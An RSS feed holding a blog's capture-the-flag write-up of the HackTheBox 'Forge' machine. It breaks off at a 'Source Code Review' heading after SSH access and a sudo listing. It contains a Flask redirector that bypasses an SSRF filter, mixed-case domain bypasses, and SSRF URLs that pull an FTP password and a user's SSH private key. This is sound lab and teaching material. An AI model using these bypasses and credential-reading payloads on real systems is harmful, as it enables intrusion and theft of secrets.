<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>HackTheBox Medium on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/series/hackthebox-medium/</link>
    <description>Recent content in HackTheBox Medium on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sat, 15 Oct 2022 21:57:48 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/series/hackthebox-medium/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Forge</title>
      <link>https://fahmifj.github.io/ctf/hackthebox/forge/</link>
      <pubDate>Sat, 15 Oct 2022 21:57:48 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/ctf/hackthebox/forge/</guid>
      <description>Bypass SSRF filters using domain redirection and abusing Python PDB</description>
      <content:encoded><![CDATA[<p>Forge features a website that has SSRF vulnerability on its upload page. Leveraging this SSRF allows me to access the internal admin portal to obtain an FTP account. The SSRF vulnerability also exists within the admin portal, allowing me  to access the FTP server and retrieve the user&rsquo;s SSH key. As for the root part, there&rsquo;s a Python script with sudo privileges that spawns an interactive debugging session when an exception event occurs. Since the script can be run as root, it is possible to abuse the interactive debugging session to spawn a root shell.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SSRF bypass filters</li>
<li>Code Review</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>nmap</li>
<li>ffuf</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Scanning TCP ports with nmap discovers 2 open ports: SSH and HTTP. There&rsquo;s also a filtered FTP service.</p>
<figure class="highlight">
    <figcaption>
        <span class="hl-cmd">$ nmap -sC -sV -oA nmap/default-script-forge 10.10.11.111</span>
    </figcaption>
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ nmap -sC -sV -oA nmap/default-script-forge 10.10.11.111   
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-13 10:54 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> forge.htb <span class="o">(</span>10.10.11.111<span class="o">)</span>
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.066s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed ports
</span></span><span class="line"><span class="cl">PORT   STATE    SERVICE VERSION
</span></span><span class="line"><span class="cl">21/tcp filtered ftp
</span></span><span class="line"><span class="cl">22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open     http    Apache httpd 2.4.41
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Gallery
</span></span><span class="line"><span class="cl">Service Info: Host: 10.10.11.111<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.61 seconds</span></span></code></pre>
</figure><p>Beside the OS and service version, the results didn&rsquo;t show any interesting details.</p>
<p>For now, I will just add <code>forge.htb</code> to my <code>/etc/hosts</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.15.190» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.111 forge.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts</span></span></code></pre>
</figure><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---forgehtb">TCP 80 - forge.htb</h3>
<p>The main website shows a gallery of images.</p>
<p><div class="img-container"><img src="imgs/image-20210913200846701.png" alt="image-20210913200846701"  /></div>
</p>
<p>Using Wapplyzer, it tells that the site is running on PHP.</p>
<p><div class="img-container"><img src="imgs/image-20221013203144811.png" alt="image-20221013203144811"  /></div>
</p>
<p>There&rsquo;s an upload page at <code>/upload</code>, which allows visitors to upload a file from local disk or a URL.</p>
<p><div class="img-container"><img src="imgs/image-20210913201318274.png" alt="image-20210913201318274"  /></div>
</p>
<h4 id="testing-upload">Testing Upload</h4>
<p>On submitting a legit JPG file, it returns with a URL to access the file.</p>
<p><div class="img-container"><img src="imgs/image-20221013210552525.png" alt="image-20221013210552525"  /></div>
</p>
<p>Since filenames are randomized, IDOR attack isn&rsquo;t an option here.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tools» «10.10.15.190» 
</span></span><span class="line"><span class="cl">$ curl -IL http://forge.htb/uploads/nMu63RoLNdk8BoE2a7b4 
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Date: Thu, <span class="m">13</span> Sept <span class="m">2021</span> 14:06:11 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Content-Disposition: inline<span class="p">;</span> <span class="nv">filename</span><span class="o">=</span>nMu63RoLNdk8BoE2a7b4
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">51142</span>
</span></span><span class="line"><span class="cl">Last-Modified: Thu, <span class="m">13</span> Sept <span class="m">2021</span> 14:05:20 GMT
</span></span><span class="line"><span class="cl">Cache-Control: no-cache
</span></span><span class="line"><span class="cl">Content-Type: image/jpg</span></span></code></pre>
</figure><p>This time, I&rsquo;ll try the <strong>upload from url</strong> option. I&rsquo;ll start a Python web server listening on port 8000. On submitting, there is a request coming from Forge&rsquo;s IP.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.15.190» 
</span></span><span class="line"><span class="cl">$ python3 -m http.server <span class="m">8000</span>
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</span></span><span class="line"><span class="cl">10.10.11.111 - - <span class="o">[</span>13/Sep/2021 09:23:38<span class="o">]</span> <span class="s2">&#34;GET /innocent.jpg HTTP/1.1&#34;</span> <span class="m">200</span> -</span></span></code></pre>
</figure><p>With <code>netcat</code>, I could see the detailed request where I can see that it&rsquo;s coming from the Python&rsquo;s request module. So I&rsquo;m guessing that the site is running on Python (most likely Flask).</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «~» «10.10.15.190» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">8000</span> 
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">8000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.15.190<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.111<span class="o">]</span> <span class="m">43242</span>
</span></span><span class="line"><span class="cl">GET /innocent.jpg HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 10.10.15.190:8000
</span></span><span class="line"><span class="cl">User-Agent: python-requests/2.25.1
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Accept: */*
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">too many output retries : Broken pipe</span></span></code></pre>
</figure><p>By trying to upload a non existent file path, the error output proves that it&rsquo;s using Python in the back end.</p>
<p><div class="img-container"><img src="imgs/image-20210913203132729.png" alt="	"  /></div>
</p>
<p>When attempting to access <code>localhost</code> and <code>127.0.0.1</code>, the website tells that these addresses are blacklisted.</p>
<p><div class="img-container"><img src="imgs/image-20210913203935343.png" alt=" "  /></div>
</p>
<p>How about FTP? Well only <code>http</code> and <code>https</code> protocols are supported here. Therefore, I can&rsquo;t touch the FTP server with this (yet).</p>
<p><div class="img-container"><img src="imgs/image-20221013213206158.png" alt="image-20221013213206158"  /></div>
</p>
<h3 id="vhost-enumeration">Vhost Enumeration</h3>
<p>Fuzzing the vhost using <code>ffuf</code> reveals an interesting subdomain: <code>admin.forge.htb</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tools» «10.10.15.190» 
</span></span><span class="line"><span class="cl">$ ffuf -u http://forge.htb -H <span class="s2">&#34;Host: FUZZ.forge.htb&#34;</span> -mc <span class="m">200</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v1.3.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : http://forge.htb
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.forge.htb
</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: <span class="m">200</span>
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">admin                   <span class="o">[</span>Status: 200, Size: 27, Words: 4, Lines: 2<span class="o">]</span></span></span></code></pre>
</figure><p>I&rsquo;ll add that domain to my <code>/etc/hosts</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «tools» «10.10.15.190» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.111 admin.forge.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts</span></span></code></pre>
</figure><h3 id="tcp-80---adminforgehtb">TCP 80 - admin.forge.htb</h3>
<p>Unfortunately, visiting <code>admin.forge.htb</code> shows a message that this domain is only reachable from localhost.</p>
<p><div class="img-container"><img src="imgs/image-20210913210859484.png" alt="image-20210913210859484"  /></div>
</p>
<p>When trying to access this domain from the upload feature, it would return the same message about blacklisted address.</p>
<p><div class="img-container"><img src="imgs/image-20210913212229777.png" alt="image-20210913212229777"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-user">Shell as user</h3>
<h4 id="ssrf-bypass-with-domain-redirection">SSRF Bypass with Domain Redirection</h4>
<p>Several SSRF bypass with number-based payload are actually works and can be used to access localhost address, but I&rsquo;ve to find domain-based bypass since the web server routes/handles <code>forge.htb</code> and <code>admin.forge.htb</code> differently (allow external access vs. internal access only).</p>
<p>Based on the previous upload testing, the site is using Python Requests module. The <code>requests.get()</code> function is <a href="https://requests.readthedocs.io/en/latest/user/quickstart/#redirection-and-history"target="_blank" rel="noopener noreferrer"
>always follow redirection by default</a>. Knowing this, there&rsquo;s a high chance that bypassing the SSRF filter using domain redirection would work.</p>
<p>Here&rsquo;s the strategy:</p>
<ul>
<li>Host a simple site redirector that always redirect any incoming request to <code>http://admin.forge.htb</code>.</li>
<li>Submit the redirector URL on the upload page at <code>forge.htb/upload</code>.</li>
</ul>
<p>And here&rsquo;s the visualization of how the SSRF filter bypass using domain redirection.</p>
<p><div class="img-container"><img src="imgs/image-20221015214529436.png" alt="image-20221015214529436"  /></div>
</p>
<p>I&rsquo;ll write the redirector using Flask.</p>
<p><code>redirector.py</code>:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">redirect</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s2">&#34;http://admin.forge.htb/&#34;</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span></span></span></code></pre>
</figure><p>I&rsquo;ll run the redirector with:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ python3 redirector.py</span></span></code></pre>
</figure><p>After the redirector is running, I&rsquo;ll head to the upload page, intercept the upload request and change the URL value to my machine IP.</p>
<p>On submitting the request, I see there&rsquo;s a success message in the response.</p>
<p><div class="img-container"><img src="imgs/image-20221015112628345.png" alt="image-20221015112628345"  /></div>
</p>
<p>A little explanation:</p>
<ol>
<li>My IP is not in the blacklist address, so the site (Forge) starts making a request to it, where eventually falls in to the redirector site.</li>
<li>Since <code>requests.get()</code> follows redirection by default, the request goes straight to the site I intended to redirect to, which is <code>admin.forge.htb</code>. It eventually bypasses the checks for blacklisted addresses.</li>
<li>Finally, the site takes the whole <code>admin.forge.htb</code> page as a file content and uploads it to the <code>forge.htb/upload</code>. Now I can see <code>admin.forge.htb</code> page by accessing that file from the given URL.</li>
</ol>
<h4 id="ssrf-bypass-with-mixed-case">SSRF Bypass with Mixed Case</h4>
<p>Another way to bypass the filters is mixing upper case and lower case on the domain name like <code>admin.forge.htB</code>:</p>
<p><div class="img-container"><img src="imgs/image-20210913214359458.png" alt="image-20210913214359458"  /></div>
</p>
<p>Both bypass methods are working fine.</p>
<p>Now with <code>curl</code>, I could see the page source of <code>admin.forge.htb</code>. There&rsquo;s two links here: <code>/announcements</code> and another <code>/upload</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.13» 
</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/mn4G5G1B5oaF2SXMwbHH
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
</span></span><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">&lt;head&gt;
</span></span><span class="line"><span class="cl">    &lt;title&gt;Admin Portal&lt;/title&gt;
</span></span><span class="line"><span class="cl">&lt;/head&gt;
</span></span><span class="line"><span class="cl">&lt;body&gt;
</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/main.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl">    &lt;header&gt;
</span></span><span class="line"><span class="cl">            &lt;nav&gt;
</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/&#34;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right margin-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/announcements&#34;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/upload&#34;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
</span></span><span class="line"><span class="cl">            &lt;/nav&gt;
</span></span><span class="line"><span class="cl">    &lt;/header&gt;
</span></span><span class="line"><span class="cl">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
</span></span><span class="line"><span class="cl">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
</span></span><span class="line"><span class="cl">    &lt;center&gt;&lt;h1&gt;Welcome Admins!&lt;/h1&gt;&lt;/center&gt;
</span></span><span class="line"><span class="cl">&lt;/body&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;</span></span></code></pre>
</figure><p>Accessing <code>/announcements</code> via SSRF reveals interesting information:</p>
<ul>
<li>An FTP account</li>
<li>The upload feature in this admin portal now supports FTP and upload via query string <code>u</code> (<code>/upload?u=value</code>).</li>
</ul>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/NatO83YkYfhzkl9fG9MB
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
</span></span><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">&lt;head&gt;
</span></span><span class="line"><span class="cl">    &lt;title&gt;Announcements&lt;/title&gt;
</span></span><span class="line"><span class="cl">&lt;/head&gt;
</span></span><span class="line"><span class="cl">&lt;body&gt;
</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/main.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/announcements.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl">    &lt;header&gt;
</span></span><span class="line"><span class="cl">            &lt;nav&gt;
</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/&#34;</span>&gt;Portal home&lt;/a&gt;&lt;/h1&gt;
</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right margin-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/announcements&#34;</span>&gt;Announcements&lt;/a&gt;&lt;/h1&gt;
</span></span><span class="line"><span class="cl">                &lt;h1 <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;align-right&#34;</span>&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/upload&#34;</span>&gt;Upload image&lt;/a&gt;&lt;/h1&gt;
</span></span><span class="line"><span class="cl">            &lt;/nav&gt;
</span></span><span class="line"><span class="cl">    &lt;/header&gt;
</span></span><span class="line"><span class="cl">    &lt;br&gt;&lt;br&gt;&lt;br&gt;
</span></span><span class="line"><span class="cl">    &lt;ul&gt;
</span></span><span class="line"><span class="cl">        &lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt;
</span></span><span class="line"><span class="cl">        &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols <span class="k">for</span> uploading from url.&lt;/li&gt;
</span></span><span class="line"><span class="cl">        &lt;li&gt;The /upload endpoint has been configured <span class="k">for</span> easy scripting of uploads, and <span class="k">for</span> uploading an image, one can simply pass a url with ?u<span class="o">=</span><span class="p">&amp;</span>lt<span class="p">;</span>url<span class="p">&amp;</span>gt<span class="p">;</span>.&lt;/li&gt;
</span></span><span class="line"><span class="cl">    &lt;/ul&gt;
</span></span><span class="line"><span class="cl">&lt;/body&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;</span></span></code></pre>
</figure><h4 id="ftp-access">FTP Access</h4>
<p>From here, I can try accessing the FTP service via the upload feature on the admin portal using the same SSRF bypass technique.</p>
<p><div class="img-container"><img src="imgs/image-20221015121407530.png" alt="image-20221015121407530"  /></div>
</p>
<p>It seems the FTP host the user home dir. The user flag is done here.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/0c47HKRZiXNh3F5smn2z
</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">3</span> <span class="m">1000</span>     <span class="m">1000</span>         <span class="m">4096</span> Aug <span class="m">04</span> 19:23 snap
</span></span><span class="line"><span class="cl">-rw-r-----    <span class="m">1</span> <span class="m">0</span>        <span class="m">1000</span>           <span class="m">33</span> Sep <span class="m">13</span> 08:17 user.txt</span></span></code></pre>
</figure><h4 id="ssh-access">SSH Access</h4>
<p>For more stable access, I&rsquo;ll check if there&rsquo;s an SSH key:</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://admin.forge.htB/upload?u=ftp://user:heightofsecurity123!@forge.htB/.ssh/</span></span></code></pre>
</figure><p>It&rsquo;s there.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/AC1f3sbHcufWHGGTVpIG 
</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>          <span class="m">564</span> May <span class="m">31</span> 12:35 authorized_keys
</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>         <span class="m">2590</span> May <span class="m">20</span> 08:30 id_rsa
</span></span><span class="line"><span class="cl">-rw-------    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>          <span class="m">564</span> May <span class="m">20</span> 08:30 id_rsa.pub</span></span></code></pre>
</figure><p>I&rsquo;ll grab that with</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://admin.forge.htB/upload?u=ftp://:heightofsecurity123!@forge.htB/.ssh/id_rsa</span></span></code></pre>
</figure><p>And save it to my machine.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ curl -s http://forge.htb/uploads/hvcNBsh1xwD4c6Nyq0tP <span class="p">|</span> tee user_rsa
</span></span><span class="line"><span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2
</span></span><span class="line"><span class="cl"><span class="nv">shlLupso7WoS0AAAAKdXNlckBmb3JnZQE</span><span class="o">=</span>
</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----</span></span></code></pre>
</figure><p>Now I can SSH login as <code>user</code>.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «forge» «10.10.14.4» 
</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> user_rsa <span class="o">&amp;&amp;</span> ssh -i user_rsa user@forge.htb  
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System information as of Mon <span class="m">13</span> Sep <span class="m">2021</span> 03:12:44 PM UTC
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:             <span class="m">223</span>
</span></span><span class="line"><span class="cl">  Usage of /:   44.5% of 6.82GB   Users logged in:       <span class="m">0</span>
</span></span><span class="line"><span class="cl">  Memory usage: 26%               IPv4 address <span class="k">for</span> eth0: 10.10.11.111
</span></span><span class="line"><span class="cl">  Swap usage:   0%
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Mon Sep <span class="m">13</span> 13:30:33 <span class="m">2021</span> from 10.10.14.141
</span></span><span class="line"><span class="cl">user@forge:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span></span></span></code></pre>
</figure><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p><code>user</code> is allowed to run <code>/opt/remote-manage.py</code> as root.</p>
<figure class="highlight">
    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> user on forge:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User user may run the following commands on forge:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
</span></span><span class="line"><span class="cl">user@forge:~$ ls -l /opt/remote-manage.py
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">1447</span> May <span class="m">31</span> 12:09 /opt/remote-manage.py</span></span></code></pre>
</figure><h4 id="source-code-review">Source Code Review</h4>
